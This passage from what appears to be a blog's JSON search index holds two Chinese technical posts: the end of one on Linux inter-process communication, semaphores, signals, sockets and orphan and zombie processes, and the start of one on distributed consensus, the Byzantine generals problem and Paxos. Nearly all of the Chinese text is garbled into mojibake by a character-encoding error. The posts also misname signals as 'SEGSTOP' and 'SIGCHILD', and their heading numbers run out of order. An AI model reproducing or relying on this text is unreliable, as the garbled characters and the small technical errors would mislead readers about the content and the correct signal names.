1ï¼Œå°±ä»£è¡¨ç€æ˜¯äº’æ–¥ä¿¡å·é‡ï¼Œå®ƒå¯ä»¥ä¿è¯å…±äº«å†…å­˜åœ¨ä»»ä½•æ—¶åˆ»åªæœ‰ä¸€ä¸ªè¿›ç¨‹åœ¨è®¿é—®ï¼Œè¿™å°±å¾ˆå¥½çš„ä¿æŠ¤äº†å…±äº«å†…å­˜ã€‚\n\nä¾‹å¦‚ï¼Œè¿›ç¨‹ A æ˜¯è´Ÿè´£ç”Ÿäº§æ•°æ®ï¼Œè€Œè¿›ç¨‹ B æ˜¯è´Ÿè´£è¯»å–æ•°æ®ï¼Œè¿™ä¸¤ä¸ªè¿›ç¨‹æ˜¯ç›¸äº’åˆä½œã€ç›¸äº’ä¾èµ–çš„ï¼Œè¿›ç¨‹ A å¿…é¡»å…ˆç”Ÿäº§äº†æ•°æ®ï¼Œè¿›ç¨‹ B æ‰èƒ½è¯»å–åˆ°æ•°æ®ï¼Œæ‰€ä»¥æ‰§è¡Œæ˜¯æœ‰å‰åé¡ºåºçš„ã€‚\n\né‚£ä¹ˆè¿™æ—¶å€™ï¼Œå°±å¯ä»¥ç”¨ä¿¡å·é‡æ¥å®ç°å¤šè¿›ç¨‹åŒæ­¥çš„æ–¹å¼ï¼Œæˆ‘ä»¬å¯ä»¥åˆå§‹åŒ–ä¿¡å·é‡ä¸º `0`ã€‚\n\n<img src=\"linuxè¿›ç¨‹çº¿ç¨‹åŸè¯­/11-ä¿¡å·é‡-åŒæ­¥.jpg\" alt=\"img\" style=\"zoom:80%;\" />\n\n### 2.5  ä¿¡å·\n\nä¸Šé¢è¯´çš„è¿›ç¨‹é—´é€šä¿¡ï¼Œéƒ½æ˜¯å¸¸è§„çŠ¶æ€ä¸‹çš„å·¥ä½œæ¨¡å¼ã€‚å¯¹äºå¼‚å¸¸æƒ…å†µä¸‹çš„å·¥ä½œæ¨¡å¼ï¼Œå°±éœ€è¦ç”¨ã€Œä¿¡å·ã€çš„æ–¹å¼æ¥é€šçŸ¥è¿›ç¨‹ã€‚\n\nä¿¡å·è·Ÿä¿¡å·é‡è™½ç„¶åå­—ç›¸ä¼¼åº¦ 66.66%ï¼Œä½†ä¸¤è€…ç”¨é€”å®Œå…¨ä¸ä¸€æ ·ï¼Œå°±å¥½åƒ Java å’Œ JavaScript çš„åŒºåˆ«ã€‚\n\nä¿¡å·æ˜¯è¿›ç¨‹é—´é€šä¿¡æœºåˆ¶ä¸­å”¯ä¸€çš„å¼‚æ­¥é€šä¿¡æœºåˆ¶ï¼Œå› ä¸ºå¯ä»¥åœ¨ä»»ä½•æ—¶å€™å‘é€ä¿¡å·ç»™æŸä¸€è¿›ç¨‹ï¼Œä¸€æ—¦æœ‰ä¿¡å·äº§ç”Ÿï¼Œæˆ‘ä»¬å°±æœ‰ä¸‹é¢è¿™å‡ ç§ï¼Œç”¨æˆ·è¿›ç¨‹å¯¹ä¿¡å·çš„å¤„ç†æ–¹å¼ã€‚\n\n+ 1.æ‰§è¡Œé»˜è®¤æ“ä½œã€‚Linux å¯¹æ¯ç§ä¿¡å·éƒ½è§„å®šäº†é»˜è®¤æ“ä½œï¼Œä¾‹å¦‚ï¼Œä¸Šé¢åˆ—è¡¨ä¸­çš„ SIGTERM ä¿¡å·ï¼Œå°±æ˜¯ç»ˆæ­¢è¿›ç¨‹çš„æ„æ€ã€‚\n+ 2.æ•æ‰ä¿¡å·ã€‚æˆ‘ä»¬å¯ä»¥ä¸ºä¿¡å·å®šä¹‰ä¸€ä¸ªä¿¡å·å¤„ç†å‡½æ•°ã€‚å½“ä¿¡å·å‘ç”Ÿæ—¶ï¼Œæˆ‘ä»¬å°±æ‰§è¡Œç›¸åº”çš„ä¿¡å·å¤„ç†å‡½æ•°ã€‚\n+ 3.å¿½ç•¥ä¿¡å·ã€‚å½“æˆ‘ä»¬ä¸å¸Œæœ›å¤„ç†æŸäº›ä¿¡å·çš„æ—¶å€™ï¼Œå°±å¯ä»¥å¿½ç•¥è¯¥ä¿¡å·ï¼Œä¸åšä»»ä½•å¤„ç†ã€‚æœ‰ä¸¤ä¸ªä¿¡å·æ˜¯åº”ç”¨è¿›ç¨‹æ— æ³•æ•æ‰å’Œå¿½ç•¥çš„ï¼Œå³ SIGKILL å’Œ SEGSTOPï¼Œå®ƒä»¬ç”¨äºåœ¨ä»»ä½•æ—¶å€™ä¸­æ–­æˆ–ç»“æŸæŸä¸€è¿›ç¨‹ã€‚\n\n### 2.6 Socket\n\nè¦æƒ³è·¨ç½‘ç»œä¸ä¸åŒä¸»æœºä¸Šçš„è¿›ç¨‹ä¹‹é—´é€šä¿¡ï¼Œå°±éœ€è¦ Socket é€šä¿¡äº†ã€‚\n\n+ é’ˆå¯¹ TCP åè®®é€šä¿¡çš„ socket ç¼–ç¨‹æ¨¡å‹\n\n<img src=\"linuxè¿›ç¨‹çº¿ç¨‹åŸè¯­/12-TCPç¼–ç¨‹æ¨¡å‹.jpg\" alt=\"img\" style=\"zoom:50%;\" />\n\n+ é’ˆå¯¹ UDP åè®®é€šä¿¡çš„ socket ç¼–ç¨‹æ¨¡å‹\n\n<img src=\"linuxè¿›ç¨‹çº¿ç¨‹åŸè¯­/13-UDPç¼–ç¨‹æ¨¡å‹.jpg\" alt=\"img\" style=\"zoom:50%;\" />\n\n# 2. å­¤å„¿å’Œåƒµå°¸è¿›ç¨‹\n\n å½“ä¸€ä¸ªè¿›ç¨‹å®Œæˆå®ƒçš„å·¥ä½œç»ˆæ­¢ä¹‹åï¼Œå®ƒçš„çˆ¶è¿›ç¨‹éœ€è¦è°ƒç”¨wait()æˆ–è€…waitpid()ç³»ç»Ÿè°ƒç”¨å–å¾—å­è¿›ç¨‹çš„ç»ˆæ­¢çŠ¶æ€ã€‚\n\n### 2.1 å­¤å„¿è¿›ç¨‹\n\nä¸€ä¸ªçˆ¶è¿›ç¨‹é€€å‡ºï¼Œè€Œå®ƒçš„ä¸€ä¸ªæˆ–å¤šä¸ªå­è¿›ç¨‹è¿˜åœ¨è¿è¡Œï¼Œé‚£ä¹ˆé‚£äº›å­è¿›ç¨‹å°†æˆä¸ºå­¤å„¿è¿›ç¨‹ã€‚å­¤å„¿è¿›ç¨‹å°†è¢«initè¿›ç¨‹(è¿›ç¨‹å·ä¸º1)æ‰€æ”¶å…»ï¼Œå¹¶ç”±initè¿›ç¨‹å¯¹å®ƒä»¬å®ŒæˆçŠ¶æ€æ”¶é›†å·¥ä½œã€‚\n\nå­¤å„¿è¿›ç¨‹æ˜¯æ²¡æœ‰çˆ¶è¿›ç¨‹çš„è¿›ç¨‹ï¼Œå­¤å„¿è¿›ç¨‹è¿™ä¸ªé‡ä»»å°±è½åˆ°äº†initè¿›ç¨‹èº«ä¸Šï¼Œinitè¿›ç¨‹å°±å¥½åƒæ˜¯ä¸€ä¸ªæ°‘æ”¿å±€ï¼Œä¸“é—¨è´Ÿè´£å¤„ç†å­¤å„¿è¿›ç¨‹çš„å–„åå·¥ä½œã€‚å­¤å„¿è¿›ç¨‹å¹¶ä¸ä¼šæœ‰ä»€ä¹ˆå±å®³ã€‚\n\n### 2.2 åƒµå°¸è¿›ç¨‹\n\nä¸€ä¸ªè¿›ç¨‹ä½¿ç”¨forkåˆ›å»ºå­è¿›ç¨‹ï¼Œå¦‚æœå­è¿›ç¨‹é€€å‡ºï¼Œè€Œçˆ¶è¿›ç¨‹å¹¶æ²¡æœ‰è°ƒç”¨waitæˆ–waitpidè·å–å­è¿›ç¨‹çš„çŠ¶æ€ä¿¡æ¯ï¼Œé‚£ä¹ˆå­è¿›ç¨‹çš„è¿›ç¨‹æè¿°ç¬¦ä»ç„¶ä¿å­˜åœ¨ç³»ç»Ÿä¸­ã€‚è¿™ç§è¿›ç¨‹ç§°ä¹‹ä¸ºåƒµæ­»è¿›ç¨‹ã€‚\n\nä»»ä½•ä¸€ä¸ªå­è¿›ç¨‹(inité™¤å¤–)åœ¨exit()ä¹‹åï¼Œå¹¶éé©¬ä¸Šå°±æ¶ˆå¤±æ‰ï¼Œè€Œæ˜¯ç•™ä¸‹ä¸€ä¸ªç§°ä¸ºåƒµå°¸è¿›ç¨‹(Zombie)çš„æ•°æ®ç»“æ„ï¼Œç­‰å¾…çˆ¶è¿›ç¨‹å¤„ç†ã€‚å¦‚æœå­è¿›ç¨‹åœ¨exit()ä¹‹åï¼Œçˆ¶è¿›ç¨‹æ²¡æœ‰æ¥å¾—åŠå¤„ç†ï¼Œè¿™æ—¶ç”¨pså‘½ä»¤å°±èƒ½çœ‹åˆ°å­è¿›ç¨‹çš„çŠ¶æ€æ˜¯â€œZâ€ã€‚å¦‚æœçˆ¶è¿›ç¨‹èƒ½åŠæ—¶å¤„ç†ï¼Œå¯èƒ½ç”¨pså‘½ä»¤å°±æ¥ä¸åŠçœ‹åˆ°å­è¿›ç¨‹çš„åƒµå°¸çŠ¶æ€ï¼Œä½†è¿™å¹¶ä¸ç­‰äºå­è¿›ç¨‹ä¸ç»è¿‡åƒµå°¸çŠ¶æ€ã€‚\n\n##### 1. åŸå› \n\nä¾‹å¦‚æœ‰ä¸ªè¿›ç¨‹ï¼Œå®ƒå®šæœŸçš„äº§ç”Ÿä¸€ä¸ªå­è¿›ç¨‹ï¼Œè¿™ä¸ªå­è¿›ç¨‹éœ€è¦åšçš„äº‹æƒ…å¾ˆå°‘ï¼Œåšå®Œå®ƒè¯¥åšçš„äº‹æƒ…ä¹‹åå°±é€€å‡ºäº†ï¼Œå› æ­¤è¿™ä¸ªå­è¿›ç¨‹çš„ç”Ÿå‘½å‘¨æœŸå¾ˆçŸ­ï¼Œä½†æ˜¯ï¼Œçˆ¶è¿›ç¨‹åªç®¡ç”Ÿæˆæ–°çš„å­è¿›ç¨‹ï¼Œè‡³äºå­è¿›ç¨‹ é€€å‡ºä¹‹åçš„äº‹æƒ…ï¼Œåˆ™ä¸€æ¦‚ä¸é—»ä¸é—®ï¼Œè¿™æ ·ï¼Œç³»ç»Ÿè¿è¡Œä¸Šä¸€æ®µæ—¶é—´ä¹‹åï¼Œç³»ç»Ÿä¸­å°±ä¼šå­˜åœ¨å¾ˆå¤šçš„åƒµæ­»è¿›ç¨‹ï¼Œå€˜è‹¥ç”¨pså‘½ä»¤æŸ¥çœ‹çš„è¯ï¼Œå°±ä¼šçœ‹åˆ°å¾ˆå¤šçŠ¶æ€ä¸ºZçš„è¿›ç¨‹ã€‚ \n\nä¸¥æ ¼åœ°æ¥è¯´ï¼Œåƒµæ­»è¿›ç¨‹å¹¶ä¸æ˜¯é—®é¢˜çš„æ ¹æºï¼Œç½ªé­ç¥¸é¦–æ˜¯äº§ç”Ÿå‡ºå¤§é‡åƒµæ­»è¿›ç¨‹çš„é‚£ä¸ªçˆ¶è¿›ç¨‹ã€‚\n\n##### 2. è§£å†³\n\n+ è¿›ç¨‹é€šè¿‡ wait å’Œ waitpid ç­‰å‡½æ•°ç­‰å¾…å­è¿›ç¨‹ç»“æŸ\n\n  ä½†è¿™ä¼šå¯¼è‡´çˆ¶è¿›ç¨‹æŒ‚èµ·ï¼Œæ‰€ä»¥è¿™å¹¶ä¸æ˜¯ä¸€ä¸ªå¥½åŠæ³•ï¼Œçˆ¶è¿›ç¨‹å¦‚æœä¸èƒ½å’Œå­è¿›ç¨‹å¹¶å‘æ‰§è¡Œçš„è¯ï¼Œé‚£æˆ‘ä»¬åˆ›å»ºå­è¿›ç¨‹çš„æ„ä¹‰å°±æ²¡æœ‰ã€‚åŒæ—¶ä¸€ä¸ª wait åªèƒ½è§£å†³ä¸€ä¸ªå­è¿›ç¨‹ï¼Œå¦‚æœæœ‰å¤šä¸ªå­è¿›ç¨‹å°±è¦ç”¨åˆ°å¤šä¸ª wait\n\n  \n\n+ é€šè¿‡ä¿¡å·æœºåˆ¶\n\n  å­è¿›ç¨‹é€€å‡ºæ—¶ï¼Œå‘çˆ¶è¿›ç¨‹å‘é€ SIGCHILD ä¿¡å·ï¼Œçˆ¶è¿›ç¨‹å¤„ç† SIGCHILD ä¿¡å·ï¼Œåœ¨ä¿¡å·å¤„ç†å‡½æ•°ä¸­è°ƒç”¨ wait è¿›è¡Œå¤„ç†åƒµå°¸è¿›ç¨‹ã€‚\n\n  \n\n+ forkä¸¤æ¬¡\n\n  åŸç†æ˜¯å°†è¿›ç¨‹æˆä¸ºå­¤å„¿è¿›ç¨‹ï¼Œä»è€Œå…¶çš„çˆ¶è¿›ç¨‹å˜ä¸º init è¿›ç¨‹ï¼Œé€šè¿‡ init è¿›ç¨‹å¤„ç†åƒµå°¸è¿›ç¨‹ã€‚å…·ä½“æ“ä½œä¸ºï¼šçˆ¶è¿›ç¨‹ä¸€æ¬¡ fork() åäº§ç”Ÿä¸€ä¸ªå­è¿›ç¨‹éšåç«‹å³æ‰§è¡Œ wait(NULL) æ¥ç­‰å¾…å­è¿›ç¨‹ç»“æŸï¼Œç„¶åå­è¿›ç¨‹ fork() åäº§ç”Ÿå­™å­è¿›ç¨‹éšåç«‹å³exit(0)ã€‚è¿™æ ·å­è¿›ç¨‹é¡ºåˆ©ç»ˆæ­¢ï¼ˆçˆ¶è¿›ç¨‹ä»…ä»…ç»™å­è¿›ç¨‹æ”¶å°¸ï¼Œå¹¶ä¸éœ€è¦å­è¿›ç¨‹çš„è¿”å›å€¼ï¼‰ï¼Œç„¶åçˆ¶è¿›ç¨‹ç»§ç»­æ‰§è¡Œã€‚è¿™æ—¶çš„å­™å­è¿›ç¨‹ç”±äºå¤±å»äº†å®ƒçš„çˆ¶è¿›ç¨‹ï¼ˆå³æ˜¯çˆ¶è¿›ç¨‹çš„å­è¿›ç¨‹ï¼‰ï¼Œå°†è¢«è½¬äº¤ç»™Initè¿›ç¨‹æ‰˜ç®¡ã€‚äºæ˜¯çˆ¶è¿›ç¨‹ä¸å­™å­è¿›ç¨‹æ— ç»§æ‰¿å…³ç³»äº†ï¼Œå®ƒä»¬çš„çˆ¶è¿›ç¨‹å‡ä¸ºInitï¼ŒInitè¿›ç¨‹åœ¨å…¶å­è¿›ç¨‹ç»“æŸæ—¶ä¼šè‡ªåŠ¨æ”¶å°¸ï¼Œè¿™æ ·ä¹Ÿå°±ä¸ä¼šäº§ç”Ÿåƒµæ­»è¿›ç¨‹äº†ã€‚\n\n  \n\n+ kill çˆ¶è¿›ç¨‹\n\n  ä¸¥æ ¼åœ°æ¥è¯´ï¼Œåƒµæ­»è¿›ç¨‹å¹¶ä¸æ˜¯é—®é¢˜çš„æ ¹æºï¼Œç½ªé­ç¥¸é¦–æ˜¯äº§ç”Ÿå‡ºå¤§é‡åƒµæ­»è¿›ç¨‹çš„é‚£ä¸ªçˆ¶è¿›ç¨‹ã€‚å› æ­¤ï¼Œå½“æˆ‘ä»¬å¯»æ±‚å¦‚ä½•æ¶ˆç­ç³»ç»Ÿä¸­å¤§é‡çš„åƒµæ­»è¿›ç¨‹æ—¶ï¼Œç­”æ¡ˆå°±æ˜¯æŠŠäº§ç”Ÿå¤§é‡åƒµæ­»è¿›ç¨‹çš„é‚£ä¸ªå…ƒå‡¶æªæ¯™æ‰ï¼ˆä¹Ÿå°±æ˜¯é€šè¿‡ kill å‘é€ SIGTERM æˆ–è€… SIGKILL ä¿¡å·å•¦ï¼‰ã€‚æªæ¯™äº†å…ƒå‡¶è¿›ç¨‹ä¹‹åï¼Œå®ƒäº§ç”Ÿçš„åƒµæ­»è¿›ç¨‹å°±å˜æˆäº†å­¤å„¿è¿› ç¨‹ï¼Œè¿™äº›å­¤å„¿è¿›ç¨‹ä¼šè¢« init è¿›ç¨‹æ¥ç®¡ï¼Œinit è¿›ç¨‹ä¼š wait() è¿™äº›å­¤å„¿è¿›ç¨‹ï¼Œé‡Šæ”¾å®ƒä»¬å ç”¨çš„ç³»ç»Ÿè¿›ç¨‹è¡¨ä¸­çš„èµ„æºï¼Œè¿™æ ·ï¼Œè¿™äº›å·²ç»åƒµæ­»çš„å­¤å„¿è¿›ç¨‹å°±èƒ½ç‘ç›®è€Œå»äº†ã€‚\n\n\n\n# 4. å¤´è„‘é£æš´\n\n- è¿è¡Œå¯æ‰§è¡Œç¨‹åºåï¼Œä¼šäº§ç”Ÿè¿›ç¨‹ã€‚è¿›ç¨‹æœ‰ PCBï¼ˆæè¿°ç¬¦ï¼ŒçŠ¶æ€ï¼ŒCPU å¯„å­˜å™¨ï¼Œç¨‹åºè®¡æ•°å™¨ï¼‰ï¼Œç”¨æ¥ä¸Šä¸‹æ–‡åˆ‡æ¢ã€‚\n- çº¿ç¨‹åœ¨è¿›ç¨‹é‡Œï¼Œå…±äº«ä»£ç æ®µï¼Œæ•°æ®æ®µï¼Œæ‰“å¼€çš„æ–‡ä»¶ã€‚æœ‰ç‹¬ç«‹çš„å¯„å­˜å™¨å’Œæ ˆï¼Œåˆ‡æ¢æ•ˆç‡é«˜ã€‚\n- è¿›ç¨‹é€šä¿¡ï¼Œç®¡é“ï¼ˆfork åŸç†ï¼‰ï¼Œå†…æ ¸æ¶ˆæ¯é˜Ÿåˆ—ï¼Œå…±äº«å†…å­˜ï¼Œä¿¡å·ï¼ŒSocketã€‚\n- äº§ç”Ÿåƒµå°¸è¿›ç¨‹åŸå› æ²¡ waitï¼Œè§£å†³ï¼šwaitï¼Œå­è¿›ç¨‹ç»™çˆ¶è¿›ç¨‹å‘ä¿¡å·ï¼Œè¿ç»­ fork ä¸¤æ¬¡å˜å­¤å„¿ï¼Œkill çˆ¶è¿›ç¨‹ã€‚\n\n# 5. å‚è€ƒèµ„æ–™\n\n+ https://www.xiaolincoding.com/os/4_process/process_base.html\n","tags":["linux"],"categories":["ç³»ç»Ÿ"]},{"title":"åˆ†å¸ƒå¼åè®®å’Œç®—æ³•","url":"%2Fp%2Fe9812233.html","content":"\n# 1. åˆ†å¸ƒå¼ç®—æ³•\n\n### 1.1 åˆ†å¸ƒå¼ç®—æ³•çš„å››å¤§ç»´åº¦\n\nå››å¤§ç»´åº¦ï¼šæ‹œå åº­å®¹é”™ã€ä¸€è‡´æ€§ã€æ€§èƒ½ã€å¯ç”¨æ€§ã€‚\n\n<img src=\"åˆ†å¸ƒå¼åè®®å’Œç®—æ³•/640.png\" alt=\"img\" style=\"zoom:75%;\" />\n\n<!-- more -->\n\n+ æ‹œå åº­å®¹é”™\n\n  æ‹œå åº­å®¹é”™å°±æ˜¯ã€Šæ‹œå åº­å°†å†›é—®é¢˜ã€‹ä¸­æå‡ºçš„ä¸€ä¸ªæ¨¡å‹ï¼Œè¯¥æ¨¡å‹æè¿°äº†ä¸€ä¸ªå®Œå…¨ä¸å¯ä¿¡çš„åœºæ™¯ã€‚ä¸å¯ä¿¡ä½“ç°åœ¨ï¼š\n\n  - æ•…éšœè¡Œä¸ºã€‚æ¯”å¦‚èŠ‚ç‚¹æ•…éšœäº†ã€‚\n  - æ¶æ„è¡Œä¸ºã€‚æ¯”å¦‚æ¶æ„èŠ‚ç‚¹å†’å……æ­£å¸¸èŠ‚ç‚¹ï¼Œå‘å‡ºé”™è¯¯æŒ‡ä»¤ã€‚\n\n+ ä¸€è‡´æ€§\n\n  ä¸€è‡´æ€§åˆ†ä¸ºä¸‰ç§ï¼š\n\n  - å¼ºä¸€è‡´æ€§ï¼šä¿è¯å†™æ“ä½œå®Œæˆåï¼Œä»»ä½•åç»­è®¿é—®éƒ½èƒ½è¯»åˆ°æ›´æ–°åçš„å€¼ã€‚\n  - å¼±ä¸€è‡´æ€§ï¼šå†™æ“ä½œå®Œæˆåï¼Œç³»ç»Ÿä¸èƒ½ä¿è¯åç»­çš„è®¿é—®éƒ½èƒ½è¯»åˆ°æ›´æ–°åçš„å€¼ã€‚\n  - æœ€ç»ˆä¸€è‡´æ€§ï¼šä¿è¯å¦‚æœå¯¹æŸä¸ªå¯¹è±¡æ²¡æœ‰æ–°çš„å†™æ“ä½œï¼Œæœ€ç»ˆæ‰€æœ‰åç»­è®¿é—®éƒ½èƒ½è¯»åˆ°ç›¸åŒçš„æœ€è¿‘æ›´æ–°çš„å€¼ã€‚\n\n  åœ¨æ•°æ®åº“æ“ä½œå±‚é¢ï¼Œæˆ‘ä»¬å¤šä½¿ç”¨äºŒé˜¶æ®µæäº¤åè®®ï¼ˆ2PCï¼‰ä¿è¯å¼ºä¸€è‡´æ€§ã€‚åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼Œå¤šä½¿ç”¨ **Raft ç®—æ³•æ¥ä¿è¯å¼ºä¸€è‡´æ€§**ã€‚\n\n  å¦‚æœè€ƒè™‘å¯ç”¨æ€§ï¼Œåˆ™ä½¿ç”¨ Gossip åè®®å®ç°æœ€ç»ˆä¸€è‡´æ€§ï¼Œé…åˆ Quorum NWR ç®—æ³•çš„ä¸‰ä¸ªå‚æ•°æ¥è°ƒèŠ‚å®¹é”™èƒ½åŠ›ã€‚**è€Œ zookeeper åŸºäºè¯»æ€§èƒ½çš„è€ƒè™‘ï¼Œé€šè¿‡ ZAB åè®®æä¾›æœ€ç»ˆä¸€è‡´æ€§ã€‚**\n\n+ æ€§èƒ½\n\n  å¯ç”¨æ€§æœ€å¼ºçš„å°±æ˜¯ Gossip åè®®äº†ï¼Œå³æ—¶åªæœ‰ä¸€ä¸ªèŠ‚ç‚¹ï¼Œé›†ç¾¤å¯ä»¥æä¾›æœåŠ¡ã€‚\n\n  ç„¶åæ˜¯ Paxos/Raft/ZAB/Quorum NWR/FBFT/POW ç®—æ³•ï¼Œèƒ½å¤Ÿå®¹å¿éƒ¨åˆ†èŠ‚ç‚¹æ•…éšœã€‚\n\n  è€Œ 2PCã€TCC è¦æ±‚æ‰€æœ‰èŠ‚ç‚¹éƒ½æ­£å¸¸è¿è¡Œï¼Œç³»ç»Ÿæ‰èƒ½æ­£å¸¸å·¥ä½œï¼Œå¯ç”¨æ€§æœ€ä½ã€‚\n\n+ å¯ç”¨æ€§\n\n  ä¸Šé¢å¯ç”¨æ€§çš„æ’åºåŒæ ·é€‚ç”¨äºæ€§èƒ½ç»´åº¦ã€‚Gossip åè®®å¯ç”¨äº AP å‹åˆ†å¸ƒå¼ç³»ç»Ÿï¼Œæ°´å¹³æ‰©å±•èƒ½åŠ›å¼ºï¼Œè¯»å†™æ€§èƒ½æœ€å¼ºã€‚\n\n  Paxos/Raft/ZAB/Quorum NWR/FBFT/POW ç®—æ³•éƒ½æ˜¯é¢†å¯¼è€…æ¨¡å‹ï¼Œå†™æ€§èƒ½ä¾èµ–é¢†å¯¼è€…ï¼Œè¯»æ€§èƒ½ä¾èµ–ä¸€è‡´æ€§çš„å®ç°ã€‚æ€§èƒ½å¤„äºä¸­ç­‰ä½ç½®ã€‚\n\n  è€Œ 2PCã€TCC å®ç°äº‹åŠ¡æ—¶ï¼Œéœ€è¦é¢„ç•™å’Œé”å®šèµ„æºï¼Œæ€§èƒ½è¾ƒå·®ã€‚\n\n\n\n# 2. æ‹œå åº­é—®é¢˜\n\n<img src=\"åˆ†å¸ƒå¼åè®®å’Œç®—æ³•/640-20230904190503340.png\" alt=\"å›¾ç‰‡\" style=\"zoom:75%;\" />\n\n- åˆ˜å¤‡å†³å®šè¿›æ”»ï¼Œé€šè¿‡ä¿¡ä½¿å‘Šè¯‰æ›¹æ“å’Œå­™åšè¿›æ”»ã€‚\n- æ›¹æ“å†³å®šæ’¤é€€ï¼Œé€šè¿‡ä¿¡ä½¿å‘Šè¯‰åˆ˜å¤‡å’Œå­™åšæ’¤é€€ã€‚\n- å­™åšä½œä¸ºå†…å¥¸ä½¿è¯ˆï¼Œé€šè¿‡ä¿¡ä½¿å‘Šè¯‰åˆ˜å¤‡è¿›æ”»ï¼Œå‘Šè¯‰æ›¹æ“æ’¤é€€ã€‚\n\nåˆ˜å¤‡çš„ç¥¨æ•°ä¸ºè¿›æ”» 2 ç¥¨ï¼Œæ’¤é€€ 1 ç¥¨ï¼Œæ›¹æ“çš„ç¥¨æ•°ä¸ºè¿›æ”» 1 ç¥¨ï¼Œæ’¤é€€ 2 ç¥¨ã€‚æŒ‰ç…§å°‘æ•°æœä»å¤šæ•°çš„åŸåˆ™ï¼Œåˆ˜å¤‡æœ€åä¼šé€‰æ‹©è¿›æ”»ï¼Œè€Œæ›¹æ“ä¼šé€‰æ‹©æ’¤é€€ï¼Œå­™åšä½œä¸ºå†…å¥¸è‚¯å®šä¸ä¼šè¿›æ”»ï¼Œåˆ˜å¤‡å•ç‹¬è¿›æ”»åè´¼è‘£å“ï¼ŒåŠ¿å•åŠ›è–„ï¼Œè¢«è‘£å“å¹²æ‰äº†ã€‚\n\n### 2.1 æ‹œå åº­é—®é¢˜è§£æ³•\n\nå¦‚æœå›å°†äººæ•°ä¸º mï¼Œå°†å†›æ•° n >= 3m + 1ï¼Œé‚£ä¹ˆå°±å¯ä»¥è§£å†³æ‹œå åº­å°†å†›é—®é¢˜ã€‚\n\nå‰ææ¡ä»¶ï¼šå›å°†æ•° m å·²çŸ¥ï¼Œéœ€è¦è¿›è¡Œ m + 1 è½®çš„ä½œæˆ˜åå•†ã€‚\n\næ¯”å¦‚ä¸Šè¿°çš„æ”»æ‰“è‘£å“é—®é¢˜ï¼Œæ›¹æ“ã€åˆ˜å¤‡ã€å­™åšä¸‰ä¸ªäººå½“ä¸­ï¼Œå­™åšæ˜¯å›å°†ï¼Œä»–å¯ä»¥ä½¿è¯ˆï¼Œä½¿ä½œæˆ˜è®¡åˆ’ä¸ç»Ÿä¸€ã€‚å¿…é¡»å¢åŠ ä¸€ä½å¿ è‡£è¢ç»æ¥åå•†å…±è¯†ï¼Œæ‰èƒ½è¾¾æˆä¸€è‡´æ€§ä½œæˆ˜è®¡åˆ’ã€‚\n\nå¯ä¸è¦å°ç§æ‹œå åº­é—®é¢˜ï¼Œå®ƒå¯æ˜¯åˆ†å¸ƒå¼åœºæ™¯æœ€å¤æ‚çš„çš„æ•…éšœåœºæ™¯ã€‚æ¯”å¦‚åœ¨æ•°å­—è´§å¸çš„åŒºå—é“¾æŠ€æœ¯ä¸­å°±æœ‰ç”¨åˆ°è¿™äº›çŸ¥è¯†ç‚¹ã€‚è€Œä¸”å¿…é¡»ä½¿ç”¨æ‹œå åº­å®¹é”™ç®—æ³•ï¼ˆä¹Ÿå°±æ˜¯ Byzantine Fault Toleranceï¼ŒBFTï¼‰ã€‚\n\næ‹œå åº­å®¹é”™ç®—æ³•è¿˜æœ‰ FBFT ç®—æ³•ï¼ŒPoW ç®—æ³•ã€‚\n\næœ‰äº†æ‹œå åº­å®¹é”™ç®—æ³•ï¼Œè‚¯å®šæœ‰éæ‹œå åº­å®¹é”™ç®—æ³•ï¼Œé¡¾åæ€ä¹‰ï¼Œå°±æ˜¯æ²¡æœ‰å‘é€è¯¯å¯¼ä¿¡æ¯çš„èŠ‚ç‚¹ã€‚CFT ç®—æ³•å°±æ˜¯è§£å†³åˆ†å¸ƒå¼ç³»ç»Ÿä¸­å­˜åœ¨æ•…éšœï¼Œä½†ä¸å­˜åœ¨æ¶æ„èŠ‚ç‚¹çš„åœºæ™¯ä¸‹çš„å…±è¯†é—®é¢˜ã€‚ç®€å•æ¥è¯´å°±æ˜¯å¯èƒ½å› ç³»ç»Ÿæ•…éšœé€ æˆä¸¢å¤±æ¶ˆæ¯æˆ–æ¶ˆæ¯é‡å¤ï¼Œä½†ä¸å­˜åœ¨é”™è¯¯æ¶ˆæ¯ã€ä¼ªé€ æ¶ˆæ¯ã€‚å¯¹åº”çš„ç®—æ³•æœ‰ Paxos ç®—æ³•ã€Raft ç®—æ³•ã€ZAB åè®®ã€‚\n\n**è¿™ä¹ˆå¤šç®—æ³•è¯¥å¦‚ä½•é€‰æ‹©ï¼Ÿ**\n\nèŠ‚ç‚¹å¯ä¿¡ï¼Œé€‰éæ‹œå åº­å®¹é”™ç®—æ³•ã€‚å¦åˆ™å°±ç”¨æ‹œå åº­å®¹é”™ç®—æ³•ï¼Œå¦‚åŒºå—é“¾ä¸­ç”¨åˆ°çš„ PoW ç®—æ³•ã€‚\n\n\n\n# 3. Paxos ç®—æ³•\n\n`Paxos` æ˜¯åˆ†å¸ƒå¼ç®—æ³•ä¸­çš„è€å¤§å“¥ï¼Œå¯ä»¥è¯´ Paxos æ˜¯åˆ†å¸ƒå¼å…±è¯†çš„ä»£åè¯ã€‚æœ€å¸¸ç”¨çš„åˆ†å¸ƒå¼å…±è¯†ç®—æ³•éƒ½æ˜¯åŸºäºå®ƒæ”¹è¿›ã€‚æ¯”å¦‚ Raft ç®—æ³•ã€‚æ‰€ä»¥å­¦ä¹ åˆ†å¸ƒå¼ç®—æ³•å¿…é¡»å…ˆå­¦ä¹  Paxos ç®—æ³•ã€‚\n\nPaxos ç®—æ³•ä¸»è¦åŒ…å«ä¸¤ä¸ªéƒ¨åˆ†ï¼š\n\n- **Basic Paxos ç®—æ³•**ï¼šå¤šä¸ªèŠ‚ç‚¹ä¹‹é—´å¦‚ä½•å°±æŸä¸ªå€¼è¾¾æˆå…±è¯†ã€‚ï¼ˆè¿™ä¸ªå€¼æˆ‘ä»¬ç§°ä½œ`ææ¡ˆ Value`ï¼‰\n- **Multi-Paxos ç®—æ³•**ï¼šæ‰§è¡Œå¤šä¸ª Basic Paxos å®ä¾‹ï¼Œå°±ä¸€ç³»åˆ—å€¼è¾¾æˆå…±è¯†ã€‚\n\nBasic Paxos ç®—æ³•æ˜¯ Multi-Paxos æ€æƒ³çš„æ ¸å¿ƒï¼ŒMulti çš„æ„æ€å°±æ˜¯å¤šæ¬¡ï¼Œä¹Ÿå°±æ˜¯è¯´å¤šæ‰§è¡Œå‡ æ¬¡ Basic Paxos ç®—æ³•ã€‚æ‰€ä»¥ Basic Paxos ç®—æ³•æ˜¯é‡ä¸­ä¹‹é‡ã€‚\n\n### 3.1 